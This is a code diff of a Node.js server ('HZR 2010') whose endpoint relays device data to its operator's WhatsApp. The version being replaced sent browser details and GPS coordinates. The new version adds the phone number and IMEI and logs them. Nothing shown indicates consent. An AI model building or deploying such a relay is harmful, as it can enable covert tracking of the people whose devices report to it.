@@ -16,6 +16,7 @@ const MY_WHATSAPP_NUMBER = process.env.MY_WHATSAPP_NUMBER;
 // ==========================================
 
 if (!WASENDER_TOKEN || !MY_WHATSAPP_NUMBER) {
+
     console.error("=================================");
     console.error("ERROR: Missing environment variables");
     console.error("Please set:");
@@ -91,14 +92,24 @@ app.post("/api/send-device-info", async (req, res) => {
 
 
         // ==========================================
-        // SAFE VALUES
+        // PHONE NUMBER
         // ==========================================
 
-        const browser =
-            info.browser || "Unknown";
+        const phoneNumber =
+            info.phoneNumber || "Unavailable";
 
-        const browserVersion =
-            info.browserVersion || "Unknown";
+
+        // ==========================================
+        // IMEI
+        // ==========================================
+
+        const imei =
+            info.imei || "Unavailable";
+
+
+        // ==========================================
+        // DEVICE
+        // ==========================================
 
         const manufacturer =
             info.manufacturer || "Unknown";
@@ -109,78 +120,40 @@ app.post("/api/send-device-info", async (req, res) => {
         const android =
             info.android || "Unknown";
 
-        const language =
-            info.language || "Unknown";
-
-        const online =
-            info.online !== undefined
-                ? (info.online ? "Online" : "Offline")
-                : "Unknown";
-
-        const screen =
-            info.screen || "Unknown";
-
-        const viewport =
-            info.viewport || "Unknown";
-
-        const pixelRatio =
-            info.pixelRatio || "Unknown";
-
-        const timezone =
-            info.timezone || "Unknown";
-
-        const hardwareConcurrency =
-            info.hardwareConcurrency || "Unknown";
-
-        const deviceMemory =
-            info.deviceMemory || "Unknown";
-
-        const maxTouchPoints =
-            info.maxTouchPoints !== undefined
-                ? info.maxTouchPoints
-                : "Unknown";
+        const sdk =
+            info.sdk || "Unknown";
 
 
         // ==========================================
-        // NETWORK
+        // HARDWARE
         // ==========================================
 
-        const connectionType =
-            info.connectionType || "Unknown";
-
-        const connectionSpeed =
-            info.connectionSpeed || "Unknown";
+        const cpu =
+            info.cpu || "Unknown";
 
 
         // ==========================================
         // BATTERY
         // ==========================================
 
-        const batteryLevel =
-            info.batteryLevel || "Unknown";
-
-        const batteryCharging =
-            info.batteryCharging || "Unknown";
+        const battery =
+            info.battery || "Unknown";
 
 
         // ==========================================
-        // LOCATION
+        // STORAGE
         // ==========================================
 
-        const latitude =
-            info.latitude !== undefined
-                ? info.latitude
-                : "Permission denied";
+        const storage =
+            info.storage || "Unknown";
 
-        const longitude =
-            info.longitude !== undefined
-                ? info.longitude
-                : "Permission denied";
 
-        const accuracy =
-            info.accuracy !== undefined
-                ? info.accuracy
-                : "Unknown";
+        // ==========================================
+        // SCREEN
+        // ==========================================
+
+        const screen =
+            info.screen || "Unknown";
 
 
         // ==========================================
@@ -200,51 +173,65 @@ app.post("/api/send-device-info", async (req, res) => {
 `🔵 HZR 2010
 ━━━━━━━━━━━━━━━━
 
+📞 PHONE
+Number       : ${phoneNumber}
+
+🔐 DEVICE ID
+IMEI         : ${imei}
+
 📱 DEVICE
-Device       : ${manufacturer} ${device}
-Android      : ${android}
-RAM          : ${deviceMemory} GB
-CPU          : ${hardwareConcurrency} Cores
-Touch        : ${maxTouchPoints} Points
+Manufacturer : ${manufacturer}
+Model        : ${device}
+
+🤖 ANDROID
+Version      : ${android}
+SDK          : ${sdk}
+
+⚙️ HARDWARE
+CPU Cores    : ${cpu}
+
+📺 DISPLAY
 Screen       : ${screen}
-Viewport     : ${viewport}
-Pixel Ratio  : ${pixelRatio}
-
-🌐 BROWSER
-Browser      : ${browser}
-Version      : ${browserVersion}
-Language     : ${language}
-
-📶 NETWORK
-Status       : ${online}
-Connection   : ${connectionType}
-Speed        : ${connectionSpeed}
-
-📍 LOCATION
-Latitude     : ${latitude}
-Longitude    : ${longitude}
-Accuracy     : ${accuracy} m
 
 🔋 BATTERY
-Level        : ${batteryLevel}
-Charging     : ${batteryCharging}
+Status       : ${battery}
+
+💾 STORAGE
+Storage      : ${storage}
 
 🕒 TIME
 Local Time   : ${time}
-Timezone     : ${timezone}
 
 ━━━━━━━━━━━━━━━━
-© 2010–2026 HZR 2010
-All Rights Reserved`;
+© 2010–2026 HZR 2010`;
 
 
-        console.log("Sending information to WhatsApp...");
-        console.log("Recipient:", MY_WHATSAPP_NUMBER);
 
-        console.log("Location:");
-        console.log("Latitude:", latitude);
-        console.log("Longitude:", longitude);
-        console.log("Accuracy:", accuracy);
+        // ==========================================
+        // SERVER LOG
+        // ==========================================
+
+        console.log("Phone:", phoneNumber);
+        console.log("IMEI:", imei);
+        console.log(
+            "Device:",
+            manufacturer,
+            device
+        );
+
+        console.log(
+            "Android:",
+            android
+        );
+
+        console.log(
+            "Sending information to WhatsApp..."
+        );
+
+        console.log(
+            "Recipient:",
+            MY_WHATSAPP_NUMBER
+        );
 
 
         // ==========================================
@@ -278,6 +265,10 @@ All Rights Reserved`;
             }
         );
 
+
+        // ==========================================
+        // READ RESPONSE
+        // ==========================================
 
         const resultText =
             await response.text();
@@ -410,14 +401,17 @@ app.listen(
         console.log("=================================");
         console.log("HZR 2010 SERVER");
         console.log("=================================");
+
         console.log(
             `Server running on port ${PORT}`
         );
+
         console.log(
             "Service: Online"
         );
+
         console.log(
-            "=================================",
+            "================================="
         );
 
     }
